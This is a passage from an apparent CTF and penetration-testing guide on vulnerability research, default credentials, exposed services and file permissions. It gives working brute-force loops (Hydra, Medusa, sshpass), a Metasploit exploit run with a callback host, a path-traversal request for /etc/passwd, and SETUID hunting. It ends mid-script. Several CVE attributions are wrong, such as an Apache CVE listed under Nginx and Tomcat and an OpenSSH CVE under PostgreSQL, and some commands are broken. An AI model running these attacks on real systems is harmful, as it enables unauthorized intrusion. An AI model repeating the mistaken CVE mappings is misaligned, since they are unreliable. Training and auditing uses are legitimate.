**nvd.nist.gov (National Vulnerability Database)** enhances CVE data with CVSS scores, CWE classifications, and additional metadata. Access the search interface:

```
https://nvd.nist.gov/vuln/detail/CVE-2021-44228
```

Returns comprehensive vulnerability information including attack vector, attack complexity, required privileges, and impact assessment. CVSS scores (0-10) quantify severity.

Advanced search with filtering:

```
https://nvd.nist.gov/vuln/search/results?query=log4j&searchType=all
```

Search results include affected versions, fix availability, and reference links. Filter by CVSS score:

```
https://nvd.nist.gov/vuln/search/results?query=apache&cvssV3Min=7.0&cvssV3Max=10.0
```

This returns high-severity vulnerabilities only. Narrow by year:

```
https://nvd.nist.gov/vuln/search/results?query=apache&pubStartDate=2021-01-01&pubEndDate=2021-12-31
```

Identify vulnerabilities by CWE (Common Weakness Enumeration) classification:

```
https://nvd.nist.gov/vuln/search/results?query=cwe-79&searchType=all
```

CWE-79 is Cross-Site Scripting (XSS). Searching by CWE discovers all known CVEs related to that weakness.

API access enables programmatic vulnerability research. NVAPI provides JSON responses:

```bash
curl https://services.nvd.nist.gov/rest/json/cves/1.0?keyword=log4j
```

[Unverified] NVD API availability and rate limits may change; documentation at nvd.nist.gov should be consulted for current specifications.

Parse API responses to extract vulnerability data:

```bash
curl -s https://services.nvd.nist.gov/rest/json/cves/1.0?keyword=apache | jq '.result.CVE_Items[] | {cveId: .cve.CVE_data_meta.ID, description: .cve.description.description_data[0].value}'
```

This extracts CVE IDs and descriptions. Filter by publication date:

```bash
curl -s "https://services.nvd.nist.gov/rest/json/cves/1.0?keyword=apache&pubStartDate=2021-01-01T00:00:00" | jq '.result.CVE_Items | length'
```

Returns count of vulnerabilities matching criteria.

**exploit-db.com (Exploit Database)** aggregates proof-of-concept exploits, shellcode, and security tools. Search the database:

```
https://www.exploit-db.com/?type=webapps&platform=&autho=&port=&text=&cve=CVE-2021-44228&lang=
```

CVE parameter searches for specific vulnerability IDs. Filters available for type (webapps, local, remote), platform (Windows, Linux), and language (Python, Ruby, Bash).

Download exploits directly:

```bash
searchsploit -t CVE-2021-44228
```

The searchsploit utility searches the local Exploit Database mirror (installed with Kali Linux). [Unverified] Local mirror may not reflect latest exploit submissions; online search at exploit-db.com provides current results.

Fetch specific exploit:

```bash
searchsploit -m 50489
```

The `-m` flag mirrors (downloads) exploit 50489 to current directory. Display exploit content:

```bash
cat 50489.rb
```

Examine proof-of-concept code for exploitation methodology.

Search by multiple criteria:

```bash
searchsploit apache tomcat rce
```

Returns exploits mentioning all search terms. Filter results:

```bash
searchsploit apache tomcat rce --exclude="txt"
```

Excludes text-only results (typically informational content). Download multiple exploits:

```bash
for id in 50489 50490 50491; do
  searchsploit -m $id
done
```

Batch download facilitates testing multiple exploit variants.

### Service-Specific Exploit Research

Service-specific vulnerabilities target particular applications and protocols. Research methodology focuses on identifying affected versions and exploitation prerequisites.

**Apache HTTP Server** vulnerability research. Identify version:

```bash
curl -I http://192.168.1.100/ | grep -i "Server:"
```

Extract version number (e.g., Apache/2.4.41). Search CVE databases for version-specific issues:

```bash
searchsploit "Apache 2.4.41"
```

Returns exploits targeting that specific version. Common Apache vulnerabilities include:

- CVE-2021-41773: Path traversal via mod_alias
- CVE-2021-42013: Authentication bypass via path traversal
- CVE-2021-44790: Buffer overflow in mod_lua

Test Apache modules for vulnerabilities. Query supported modules:

```bash
curl -X OPTIONS -v http://192.168.1.100/ | grep "Allow:"
```

Module information may appear in response headers. Use nmap:

```bash
nmap --script http-methods -p 80 192.168.1.100
```

This detects allowed HTTP methods (PUT, DELETE, TRACE) which indicate exploitation possibilities. [Inference] PUT method enables arbitrary file upload; DELETE enables file deletion; TRACE may expose XST (cross-site tracing) vulnerabilities.

**Nginx** vulnerability research. Identify version:

```bash
curl -I http://192.168.1.100/ | grep -i "Server: nginx"
```

Search version-specific CVEs:

```bash
searchsploit "nginx 1.16.0"
```

Common Nginx vulnerabilities include:

- CVE-2019-9511: HTTP/2 denial of service
- CVE-2021-23017: Off-by-one in resolver
- CVE-2021-3618: Off-by-one in parse_simd

Test Nginx misconfigurations. Query location directives:

```bash
curl -v http://192.168.1.100/../../../etc/passwd
```

Nginx path normalization bypass (CVE-2021-41773 variant) may expose sensitive files.

**Microsoft IIS** vulnerability research. Query IIS version:

```bash
curl -I http://192.168.1.100/ | grep -i "Server: Microsoft-IIS"
```

IIS version mapping:

- IIS 7.0: Windows Server 2008
- IIS 7.5: Windows Server 2008 R2
- IIS 8.0: Windows Server 2012
- IIS 8.5: Windows Server 2012 R2
- IIS 10.0: Windows Server 2016/2019

Search version-specific exploits:

```bash
searchsploit "IIS 8.5 RCE"
```

Common IIS vulnerabilities include:

- CVE-2015-2119: WebDAV remote code execution
- CVE-2017-9822: Remote code execution in ASP.NET
- CVE-2021-21985: Remote code execution in VMware vCenter (uses IIS)

Test WebDAV support (common in older IIS installations):

```bash
curl -X PROPFIND -v http://192.168.1.100/
```

Response indicating WebDAV support reveals potential file upload/execution vectors.

**Apache Tomcat** vulnerability research. Identify version through manager interface:

```bash
curl http://192.168.1.100:8080/manager/html
```

Unauthorized access to manager indicates potential privilege escalation. Check version header:

```bash
curl -I http://192.168.1.100:8080/ | grep -i "Server:"
```

Common Tomcat vulnerabilities include:

- CVE-2021-24122: Session persistence vulnerability
- CVE-2021-30639: Authentication bypass
- CVE-2021-41773: Path traversal (via mod_alias)

Search version-specific exploits:

```bash
searchsploit "Tomcat 9.0.50"
```

Test default credentials on Tomcat manager:

```bash
curl -u admin:admin http://192.168.1.100:8080/manager/html
```

Default credentials (admin:admin, manager:manager, tomcat:tomcat) often remain configured.

**OpenSSL** vulnerability research (critical for HTTPS services). Query certificate for OpenSSL version information:

```bash
openssl s_client -connect 192.168.1.100:443 < /dev/null | openssl x509 -text -noout | grep -i "OpenSSL"
```

[Unverified] Certificate information may not directly reveal OpenSSL version; indirect testing through protocol support may be more reliable.

Test for known OpenSSL vulnerabilities:

```bash
sslscan 192.168.1.100:443
```

Output highlights vulnerable protocols (SSLv3, TLSv1.0) and ciphers. Common OpenSSL vulnerabilities include:

- CVE-2014-0160: Heartbleed (buffer over-read)
- CVE-2016-0701: NIST ECC curve key recovery
- CVE-2017-1000364: Stack clash vulnerability

**PostgreSQL** vulnerability research. Identify version:

```bash
psql -h 192.168.1.100 -U postgres -c "SELECT version();" 2>&1 | head -1
```

If connection fails, attempt default credentials or check service banner:

```bash
nc -v 192.168.1.100 5432
```

Common PostgreSQL vulnerabilities include:

- CVE-2019-9193: Remote code execution via COPY TO
- CVE-2021-22118: SQL injection in parser
- CVE-2021-41617: Authentication bypass

Search version-specific exploits:

```bash
searchsploit "PostgreSQL 12.0"
```

Test for unauthenticated queries:

```bash
psql -h 192.168.1.100 -U postgres -w < /dev/null
```

Missing password requirement enables anonymous database access.

**MySQL/MariaDB** vulnerability research. Identify version:

```bash
mysql -h 192.168.1.100 -u root -e "SELECT VERSION();" 2>&1 | grep -v "Warning"
```

If connection fails, attempt banner grabbing:

```bash
nc -v 192.168.1.100 3306
```

MySQL typically responds with version in the connection header. Common vulnerabilities include:

- CVE-2021-2109: Privilege escalation via LOAD DATA LOCAL INFILE
- CVE-2021-2217: SQL injection in mysqlsh
- CVE-2021-22579: Authentication bypass

Test for default credentials:

```bash
mysql -h 192.168.1.100 -u root -proot
mysql -h 192.168.1.100 -u root -e "SELECT 1;"
```

### Version-Specific Vulnerabilities

Version identification is prerequisite for targeted vulnerability research. Banner grabbing, error messages, and file signatures reveal versions.

**Version Extraction via HTTP Headers:**

```bash
curl -I http://192.168.1.100/ | grep -E "Server:|X-Powered-By:|X-AspNet-Version:"
```

Multiple headers may reveal layered technologies (web server + application framework). Parse specific header:

```bash
curl -I http://192.168.1.100/ -H "User-Agent: Mozilla" | grep "Server:" | cut -d' ' -f2-
```

**Version Detection via Error Messages:**

```bash
curl http://192.168.1.100/invalid_path
```

Detailed error messages often disclose software and version. Different software produces distinctive error page formatting.

**Version Detection via File Signatures:**

```bash
curl http://192.168.1.100/index.php
head -1
```

HTML comments, meta tags, or JavaScript includes may reference versions:

```bash
curl http://192.168.1.100/ | grep -oE "version[=:].*" | head -5
```

**Platform-Specific Version Research:**

Windows-based services often reveal OS version through service banners. Test SMB version:

```bash
nmap --script smb-os-discovery -p 445 192.168.1.100
```

Output displays Windows version (e.g., Windows Server 2016 [10.0.14393]).

Linux-based services reveal distribution and kernel version through OS fingerprinting:

```bash
nmap -O 192.168.1.100 -p 22,80,443
```

**Systematic Version-to-Vulnerability Mapping:**

Create a matrix of installed software versions and known CVEs:

```bash
# Identify services
nmap -sV -p- 192.168.1.100 > services.txt

# Extract versions
grep "open" services.txt | awk '{print $3, $4, $5}' > software_versions.txt

# Search CVEs for each
while read software version; do
  echo "Researching $software $version"
  searchsploit "$software $version"
done < software_versions.txt
```

This automates version-to-exploit mapping.

**CVE Severity Assessment by Version:**

High-severity CVEs (CVSS > 7.0) affecting specific versions warrant priority testing:

```bash
# Query NVD for high-severity CVEs
curl -s "https://services.nvd.nist.gov/rest/json/cves/1.0?keyword=apache&cvssV3Min=7.0" | \
  jq '.result.CVE_Items[] | {cveId: .cve.CVE_data_meta.ID, cvssScore: .impact.baseMetricV3.cvssV3.baseScore}'
```

Parse results to identify exploitation candidates.

**Version-Specific Default Credentials:**

Different versions may have version-specific default credentials or configuration weaknesses:

```bash
# Test version-specific defaults
curl -u admin:admin123 http://192.168.1.100/
curl -u administrator:password http://192.168.1.100/
curl -u root:root http://192.168.1.100/
```

Older versions frequently ship with weaker defaults.

### Default Credentials Databases

Default credentials represent low-hanging fruit in CTF exploitation. Systematic database searches identify credential pairs likely to grant access.

**defaultpasswords.com** provides searchable database of default credentials:

```
https://defaultpasswords.com/?s=apache
```

Search by vendor or product name. Results include username, password, and access method (web, SSH, etc.).

**cirt.net** maintains default router and device credentials:

```
https://www.cirt.net/passwords?vendor=Cisco
```

Vendor-specific filtering narrows results. Credentials organized by device type and firmware version.

**SecLists** repository (GitHub) contains default credential wordlists:

```bash
git clone https://github.com/danielmiessler/SecLists
grep -r "default" SecLists/Passwords/Default-Credentials/
```

[Unverified] SecLists may not comprehensively cover all default credentials; manual verification against product documentation recommended.

**OSINT-based Credential Discovery:**

Product documentation often publishes default credentials in installation guides:

```bash
curl https://docs.example.com/installation.html | grep -i "default\|credentials\|password"
```

GitHub repositories containing code or configuration may disclose hardcoded credentials:

```bash
curl https://raw.githubusercontent.com/example/project/main/config.py | grep -i "password\|api_key"
```

[Inference] Published code often contains inadvertently disclosed default or test credentials.

**Systematic Credential Testing:**

Create wordlist combining common usernames and passwords:

```bash
# Common usernames
echo -e "admin\nadministrator\nroot\nguest\ntest" > usernames.txt

# Common passwords
echo -e "admin\npassword\n123456\nPassword123!\nadmin123" > passwords.txt

# Test combinations
hydra -L usernames.txt -P passwords.txt ssh://192.168.1.100
```

Hydra tests credential combinations across protocols. Test web services:

```bash
hydra -L usernames.txt -P passwords.txt http-post-form://192.168.1.100/login.php:"username=^USER^&password=^PASS^:Invalid"
```

The HTTP form syntax specifies POST parameters and failure indicator.

**Service-Specific Default Credential Testing:**

**SSH:**

```bash
ssh -o PreferredAuthentications=password admin@192.168.1.100
ssh -o PreferredAuthentications=password root@192.168.1.100
```

**Telnet:**

```bash
(sleep 1; echo admin; sleep 1; echo admin; sleep 1) | telnet 192.168.1.100
```

**FTP:**

```bash
ftp 192.168.1.100
ftp> user anonymous
ftp> pass anonymous
```

**SMB (Windows shares):**

```bash
smbclient -U admin //192.168.1.100/share -c "ls"
```

**MySQL:**

```bash
mysql -h 192.168.1.100 -u root -proot
mysql -h 192.168.1.100 -u root
```

**PostgreSQL:**

```bash
psql -h 192.168.1.100 -U postgres -w
psql -h 192.168.1.100 -U postgres -c "SELECT 1;"
```

**SNMP:**

```bash
snmpwalk -c public 192.168.1.100
snmpwalk -c private 192.168.1.100
```

### Known Public Exploits Searching

Public exploit availability indicates potential CTF exploitation paths. Systematic searching identifies applicable exploits.

**Exploit-DB Advanced Search Techniques:**

Combine multiple search terms for precision:

```bash
searchsploit "Apache 2.4.41 RCE"
```

Returns exploits targeting specific version and vulnerability type. Filter by vulnerability class:

```bash
searchsploit -t local apache 2.4.41
searchsploit -t remote apache 2.4.41
searchsploit -t webapps apache 2.4.41
```

Type `-t` filters: local (requires system access), remote (network accessible), webapps (web applications).

Search by programming language:

```bash
searchsploit -l python apache 2.4
```

Python exploits integrate easily into CTF automation workflows. Bash and Ruby exploits support command-line usage.

**Metasploit Module Search:**

Metasploit contains extensive exploit modules. Search within msfconsole:

```
msfconsole
msf > search apache 2.4.41
msf > use exploit/unix/webapp/apache_mod_alias_rce
msf > info
```

The `info` command displays module details including CVSS score, description, and exploitation requirements.

Configure and execute module:

```
msf > set RHOSTS 192.168.1.100
msf > set LHOST 192.168.1.50
msf > set LPORT 4444
msf > exploit
```

Parameters: RHOSTS (target), LHOST (callback IP), LPORT (callback port).

**GitHub Exploit Repository Search:**

GitHub hosts numerous proof-of-concept exploits. Search syntax:

```
site:github.com "CVE-2021-44228" RCE
```

Restricts Google search to GitHub. [Inference] GitHub exploits may lack maintenance or contain errors; testing in controlled environments recommended.

Clone relevant repositories:

```bash
git clone https://github.com/X1r0z/ActiveMQ-RCE
cd ActiveMQ-RCE
python exploit.py --help
```

Review code before execution to understand exploitation methodology.

**HackerOne and Bug Bounty Disclosures:**

Public vulnerability disclosures on HackerOne often include proof-of-concept code:

```
https://hackerone.com/reports?report_id=XXX
```

Vulnerability write-ups describe exploitation steps and technical details. [Unverified] HackerOne reports may have restricted access; public disclosures only after vendor patch.

**Academic and Security Research Papers:**

Academic conferences (Black Hat, Defcon, CCS) publish vulnerability research:

```bash
curl https://scholar.google.com/scholar?q="CVE-2021-44228" filetype:pdf
```

Papers often include proof-of-concept code and exploitation examples.

**Automated Exploit Searching Workflow:**

Combine reconnaissance with automated exploit identification:

```bash
#!/bin/bash
TARGET=$1

# Identify services
nmap -sV -p- $TARGET > nmap_results.txt

# Extract software and versions
grep "open" nmap_results.txt | awk '{print $3, $NF}' | while read software version; do
  echo "[*] Searching exploits for $software $version"
  searchsploit "$software $version" | grep -v ".txt"
done
```

This script automates reconnaissance-to-exploit mapping for multiple services.

**Exploit Feasibility Assessment:**

Not all public exploits apply to target environments. Evaluate feasibility:

1. **Version Match:** Verify target version matches exploit requirements
2. **Architecture:** Confirm exploit architecture (x86/x64/ARM) matches target
3. **Dependencies:** Verify required libraries/frameworks are present
4. **Authentication:** Determine if exploitation requires credentials
5. **Network Access:** Confirm network path to vulnerable service exists

[Inference] Authentication-requiring exploits may be bypassed through unauthenticated vulnerabilities in the same service or other services.

Related topics for expanded coverage: Custom exploit development for identified vulnerabilities, exploit modification for target-specific conditions, and integration of multiple exploits for privilege escalation chains.

---

## Configuration Weakness Detection

### Weak/Default Credentials

Default credentials are often left unchanged during system deployment, providing immediate access vectors. Systematic enumeration and testing can identify systems relying on manufacturer or installation defaults.

**Common default credential databases:**

```bash
# Online default credential references
# https://www.cirt.net/passwords
# https://default-password.info/
# https://github.com/ihebski/DefaultCreds-cheat-sheet

# Local credential wordlists in Kali Linux
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Default-Credentials/
```

**SSH default credential testing:**

```bash
# Basic SSH testing against common defaults
ssh root@192.168.1.100                # No password prompt (password-less)
ssh -o StrictHostKeyChecking=no root@192.168.1.100  # Skip host key verification

# Hydra brute-force with default credential list
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  -t 4 -v ssh://192.168.1.100

# Medusa alternative for parallel testing
medusa -h 192.168.1.100 -u root -P /usr/share/seclists/Passwords/Default-Credentials/ -M ssh

# Manual rapid testing (shell loop)
for pass in password 123456 admin root toor; do
  sshpass -p "$pass" ssh -o ConnectTimeout=2 root@192.168.1.100 "echo Success: $pass" 2>/dev/null
done
```

**HTTP/HTTPS default credential detection:**

```bash
# Web application credential testing
# Common default admin interfaces
curl -I http://192.168.1.100/admin
curl -I http://192.168.1.100:8080/console
curl -I http://192.168.1.100:8088/

# Basic authentication attempt (base64 encoded credentials)
CREDS=$(echo -n "admin:password" | base64)
curl -H "Authorization: Basic $CREDS" http://192.168.1.100/admin

# Hydra HTTP form brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.100 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"

# Hydra HTTP digest authentication
hydra -l admin -P /usr/share/seclists/Passwords/Default-Credentials/ \
  192.168.1.100 http-digest
```

**Database default credentials:**

```bash
# MySQL/MariaDB testing
mysql -h 192.168.1.100 -u root -ppassword
mysql -h 192.168.1.100 -u root -p''              # Empty password
mysql -h 192.168.1.100 -uroot

# PostgreSQL testing
psql -h 192.168.1.100 -U postgres
psql -h 192.168.1.100 -U postgres -w             # Suppress password prompt

# MongoDB testing (no authentication by default)
mongo 192.168.1.100:27017
mongo --eval "db.adminCommand('ping')" 192.168.1.100:27017

# Redis testing (no authentication by default)
redis-cli -h 192.168.1.100 ping
redis-cli -h 192.168.1.100 INFO

# MSSQL testing
sqsh -S 192.168.1.100 -U sa -P password
```

**FTP/Telnet default credentials:**

```bash
# FTP testing
ftp 192.168.1.100
# At prompt: user: anonymous, password: anonymous (or any email)
# or: user: admin, password: admin

# Hydra FTP brute-force
hydra -l ftp -P /usr/share/seclists/Passwords/Default-Credentials/ \
  -t 4 ftp://192.168.1.100

# Telnet testing (discouraged; legacy)
telnet 192.168.1.100 23
# Common defaults: root/root, admin/admin, cisco/cisco
```

**SNMP default community strings:**

```bash
# SNMP v1/v2c community string enumeration
snmpwalk -c public 192.168.1.100 1.3.6.1.2.1.1
snmpwalk -c private 192.168.1.100 1.3.6.1.2.1.1
snmpwalk -c manager 192.168.1.100 1.3.6.1.2.1.1

# OnSSET SNMP brute-force
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp-default.txt 192.168.1.100

# SNMPv3 brute-force (harder; requires valid usernames)
hydra -l snmpuser -P /usr/share/wordlists/rockyou.txt \
  snmp://192.168.1.100 -t 1
```

**Remote Desktop Protocol (RDP) testing:**

```bash
# RDP connectivity check
nmap -p 3389 192.168.1.100

# Hydra RDP brute-force
hydra -l administrator -P /usr/share/seclists/Passwords/Default-Credentials/ \
  rdp://192.168.1.100 -v

# Xfreerdp connection attempt
xfreerdp /u:administrator /p:password /v:192.168.1.100

# Rdesktop alternative
rdesktop -u administrator -p password 192.168.1.100
```

**Service-specific default credentialing:**

```bash
# Apache Tomcat (default: tomcat/tomcat)
curl -u tomcat:tomcat http://192.168.1.100:8080/manager/html

# Jenkins (often no authentication, or admin/admin)
curl http://192.168.1.100:8080/api/json | jq .

# Elasticsearch (default: no authentication)
curl http://192.168.1.100:9200/_cat/indices

# Kibana (default: no authentication)
curl http://192.168.1.100:5601/api/status

# Docker daemon (if exposed)
curl --unix-socket /var/run/docker.sock http://localhost/v1.24/images/json
```

**Systematic default credential assessment:**

```bash
#!/bin/bash
# Automated default credential testing workflow

TARGET="192.168.1.100"
PORTS=(22 23 21 3306 5432 27017 6379 8080 8888 3389)
OUTPUT="default_creds_assessment.txt"

echo "[*] Systematic default credential assessment for $TARGET"
echo "" > $OUTPUT

# SSH brute-force with common defaults
echo "[+] Testing SSH (port 22)..."
hydra -l root -P /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  -t 4 -o /tmp/ssh_results.txt ssh://192.168.1.100 2>/dev/null
grep "successfully" /tmp/ssh_results.txt >> $OUTPUT

# MySQL default testing
echo "[+] Testing MySQL (port 3306)..."
mysql -h $TARGET -u root -p'' -e "SELECT VERSION();" 2>/dev/null && echo "MySQL: root/empty" >> $OUTPUT
mysql -h $TARGET -u root -ppassword -e "SELECT VERSION();" 2>/dev/null && echo "MySQL: root/password" >> $OUTPUT

# PostgreSQL default testing
echo "[+] Testing PostgreSQL (port 5432)..."
PGPASSWORD=password psql -h $TARGET -U postgres -c "SELECT version();" 2>/dev/null && echo "PostgreSQL: postgres/password" >> $OUTPUT
PGPASSWORD='' psql -h $TARGET -U postgres -c "SELECT version();" 2>/dev/null && echo "PostgreSQL: postgres/empty" >> $OUTPUT

# Redis default testing (no auth typically)
echo "[+] Testing Redis (port 6379)..."
redis-cli -h $TARGET ping 2>/dev/null | grep -q PONG && echo "Redis: No authentication (PING successful)" >> $OUTPUT

# HTTP/HTTPS basic auth testing
echo "[+] Testing HTTP basic authentication..."
for user in admin root administrator; do
  for pass in password admin 123456; do
    CREDS=$(echo -n "$user:$pass" | base64)
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Basic $CREDS" http://$TARGET/)
    if [ "$STATUS" != "401" ]; then
      echo "HTTP basic: $user:$pass (response: $STATUS)" >> $OUTPUT
    fi
  done
done

echo "[+] Results:"
cat $OUTPUT
```

**Context-specific applications:**

- **Initial access vector:** Default credentials often provide first system entry point
- **Service enumeration:** Identifies which services accept unauthenticated connections
- **Privilege assessment:** Determines if default credentials grant administrative access
- **CTF initial compromise:** Default credentials frequently used as CTF challenge starting point

**Example CTF scenario:**

```bash
# Rapid default credential assessment
echo "[*] Testing common default credentials..."

# SSH
sshpass -p "password" ssh -o ConnectTimeout=2 root@192.168.1.100 "id" 2>/dev/null && echo "[+] SSH root:password"

# MySQL
mysql -h 192.168.1.100 -u root -p'' -e "SELECT 1;" 2>/dev/null && echo "[+] MySQL root:empty"

# PostgreSQL
PGPASSWORD='' psql -h 192.168.1.100 -U postgres -c "SELECT 1;" 2>/dev/null && echo "[+] PostgreSQL postgres:empty"

# Redis
redis-cli -h 192.168.1.100 PING 2>/dev/null | grep -q PONG && echo "[+] Redis: Unauthenticated"

# HTTP
curl -s -u admin:admin http://192.168.1.100/admin 2>/dev/null && echo "[+] HTTP admin:admin"
```

---

### Unnecessary Services Running

Unnecessary services expand attack surface by providing additional entry points. Identifying and documenting running services reveals potential exploitation targets and misconfigured systems.

**Port enumeration and service identification:**

```bash
# Comprehensive port and service scan
nmap -sV -p- 192.168.1.100

# Output format: port/protocol   state   service    version
# 22/tcp      open    ssh        OpenSSH 7.4
# 80/tcp      open    http       Apache 2.4.6
# 3306/tcp    open    mysql      MySQL 5.7.20
# 6379/tcp    open    redis      Redis 3.2.11

# Aggressive service detection
nmap -sV -A -O 192.168.1.100

# Version intensity tuning
nmap -sV --version-intensity 9 192.168.1.100  # Maximum aggressiveness
```

**Service banner grabbing for identification:**

```bash
# Raw banner capture (netcat)
nc -v 192.168.1.100 22
nc -v 192.168.1.100 80
nc -v 192.168.1.100 25

# HTTP banner collection
curl -I http://192.168.1.100
curl -I https://192.168.1.100 -k

# SSH version via connection
ssh -v 192.168.1.100 2>&1 | grep -i "remote protocol"

# FTP banner
(echo "QUIT"; sleep 1) | telnet 192.168.1.100 21

# SMTP banner and commands
telnet 192.168.1.100 25
# EHLO example.com (to see supported features)
```

**Process enumeration (if credentialed access obtained):**

```bash
# Linux process listing
ps aux | grep -E "^root|^mysql|^postgres|^www-data"

# Listening ports on target system
netstat -tlnp
ss -tlnp

# Running services via systemctl
systemctl list-units --type service --state running

# Startup services (boot persistence)
systemctl list-unit-files --state enabled

# Windows process enumeration (if RDP/WinRM access)
tasklist /v
Get-Process | Where-Object {$_.Name -match "sql|mysql|postgres"} | Format-List

# Windows listening ports
netstat -ano | findstr LISTENING
Get-NetTCPConnection -State Listen | Select LocalAddress, LocalPort, ProcessId
```

**Suspicious service identification:**

```bash
# Query all open ports systematically
for port in $(seq 1 65535); do
  (echo >/dev/tcp/192.168.1.100/$port) 2>/dev/null && echo "Port $port: open"
done

# Faster: use nmap with timing
nmap -T4 -p- 192.168.1.100 | grep open

# Identify non-standard services (ports > 1024)
nmap -sV -p 1024-65535 192.168.1.100
```

**Common unnecessary service indicators:**

```bash
# X11/Display server (potential local privilege escalation)
nmap -p 6000-6010 192.168.1.100

# Database servers accessible remotely (should be restricted)
nmap -sV -p 3306,5432,27017,6379 192.168.1.100

# Web servers on non-standard ports (development/testing systems)
nmap -sV -p 8000-9000 192.168.1.100

# RDP/VNC (remote desktop services)
nmap -p 3389,5900 192.168.1.100

# File sharing services (SMB, NFS)
nmap -p 139,445,111,2049 192.168.1.100
```

**Service risk scoring workflow:**

```bash
#!/bin/bash
# Identify unnecessary services and risk-score them

TARGET="192.168.1.100"
COMMON_PORTS="22,80,443"  # Services typically expected
OUTPUT="service_assessment.txt"

echo "[*] Service Risk Assessment for $TARGET"
echo "" > $OUTPUT

# Scan all ports
nmap -sV -p- $TARGET -oX /tmp/services.xml 2>/dev/null

# Parse XML for services
grep -oP '(?<=<service name=")[^"]+|(?<=portid=")[^"]+' /tmp/services.xml | \
  paste - - | while read port service; do
    # Check if port in expected list
    if [[ ! "$COMMON_PORTS" =~ $port ]]; then
      echo "[!] Unnecessary service detected: Port $port - $service" >> $OUTPUT
    fi
  done

cat $OUTPUT
```

**Disable unnecessary services (if privileges permit):**

```bash
# Linux service management
sudo systemctl stop mysql
sudo systemctl disable mysql           # Prevent autostart on reboot

sudo systemctl stop apache2
sudo systemctl disable apache2

sudo systemctl stop redis-server
sudo systemctl disable redis-server

# Windows service management (if administrative access)
net stop MySQL80
sc config MySQL80 start= disabled

net stop Apache2.4
sc config Apache2.4 start= disabled

# Close/block ports via firewall
sudo ufw deny in on eth0 to any port 3306
sudo ufw deny in on eth0 to any port 6379
```

**Context-specific applications:**

- **Attack surface reduction:** Disabling unused services minimizes exploitation opportunities
- **Reconnaissance data collection:** Identifies misconfigured systems with unexpected service exposure
- **System hardening verification:** Confirms unnecessary services removed during deployment
- **CTF challenge assessment:** Determines which services require exploitation for progression

**Example CTF scenario:**

```bash
# Identify potentially exploitable unnecessary services
nmap -sV -p- 192.168.1.100 > services.txt

# Filter for high-risk services
grep -E "ftp|telnet|mysql|postgres|redis|mongodb" services.txt

# Prioritize exploitation based on service:
# - FTP/Telnet: Plain-text credentials possible
# - MySQL/PostgreSQL: Unauthenticated access possible
# - Redis/MongoDB: Default no-authentication configuration
```

---

### Insecure Permissions

File and directory permissions control data access and privilege escalation opportunities. Overly permissive configurations expose sensitive data or enable privilege escalation.

**Linux file permission enumeration:**

```bash
# Identify world-readable sensitive files
find / -type f -perm -004 -name "*password*" 2>/dev/null
find / -type f -perm -004 -name "*secret*" 2>/dev/null
find / -type f -perm -004 -name "*config*" 2>/dev/null

# Find writable directories (potential privilege escalation)
find / -type d -perm -002 2>/dev/null | head -20

# Identify SETUID binaries (potential local privilege escalation)
find / -perm -4000 2>/dev/null

# Find SETGID binaries
find / -perm -2000 2>/dev/null

# Identify world-writable files in critical locations
find /etc -perm -002 2>/dev/null
find /var -perm -002 2>/dev/null
find /opt -perm -002 2>/dev/null
```

**Permission octal interpretation:**

```
Octal   Binary  Permissions
4       100     read (r)
2       010     write (w)
1       001     execute (x)

Examples:
777 = rwxrwxrwx (world-readable, writable, executable - DANGEROUS)
644 = rw-r--r-- (owner read/write, others read-only - standard file)
755 = rwxr-xr-x (owner full, others execute/read - standard directory)
600 = rw------- (owner only - private file)
700 = rwx------ (owner only - private directory)
```

**Database configuration file permissions:**

```bash
# MySQL configuration (often contains credentials)
ls -la /etc/mysql/my.cnf
ls -la /etc/mysql/conf.d/

# PostgreSQL configuration
ls -la /etc/postgresql/*/main/

# Redis configuration
ls -la /etc/redis/

# MongoDB configuration
ls -la /etc/mongod.conf
```

**SSH key permission audit:**

```bash
# Identify SSH private keys with weak permissions
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null

# Check permissions (should be 600)
ls -la ~/.ssh/id_rsa

# Identify world-readable SSH public keys
find / -name "authorized_keys" -perm -004 2>/dev/null

# Find SSH configs with weak permissions
find / -name "sshd_config" -perm -004 2>/dev/null
```

**Application-specific permission vulnerabilities:**

```bash
# Web server document root writable by web process
ls -ld /var/www/html

# Temporary file permissions
ls -ld /tmp /var/tmp

# Log file permissions (may contain sensitive data)
ls -la /var/log/
ls -la /var/log/apache2/access.log

# Cron job files (if world-readable, may reveal sensitive commands)
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
```

**Privilege escalation via SETUID binaries:**

```bash
# Find SETUID binaries owned by root
find / -perm -4000 -user root 2>/dev/null | head -20

# Check if vulnerable SETUID binaries present
# Example: vim, less, more, curl, wget with SETUID = potential privilege escalation
find / -perm -4000 -name "vim\|less\|more\|curl\|wget" 2>/dev/null
```

**Windows permission enumeration:**

```bash
# Display file permissions (NTFS ACLs)
icacls C:\sensitive_folder
icacls C:\Windows\System32\config\SAM

# Identify world-writable directories
icacls C:\temp
icacls "C:\Program Files"

# Check for inherited vs explicit permissions
icacls C:\sensitive /T  # /T = traverse subdirectories

# Check service account permissions
whoami /priv
Get-Acl C:\sensitive_folder | Format-List
```

**Permission remediation:**

```bash
# Fix overly permissive file permissions
chmod 600 sensitive_file.txt          # Owner read/write only
chmod 700 sensitive_directory/        # Owner full access only
chmod 644 public_file.txt             # Standard readable file

# Fix SSH key permissions
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
chmod 700 ~/.ssh

# Fix database configuration permissions
sudo chmod 600 /etc/mysql/my.cnf
sudo chmod 600 /etc/postgresql/*/main/postgresql.conf

# Disable SETUID bit on suspicious binaries
sudo chmod u-s /usr/bin/suspicious_binary

# Windows permission fixes
icacls C:\sensitive /inheritance:d    # Disable inheritance
icacls C:\sensitive /remove Users     # Remove Users group access
```

**Permission audit workflow:**

```bash
#!/bin/bash
# Systematic permission vulnerability assessment

echo "[*] Insecure Permission Audit"
OUTPUT="permission_audit.txt"
echo "" > $OUTPUT

# Critical files with world-readable permission
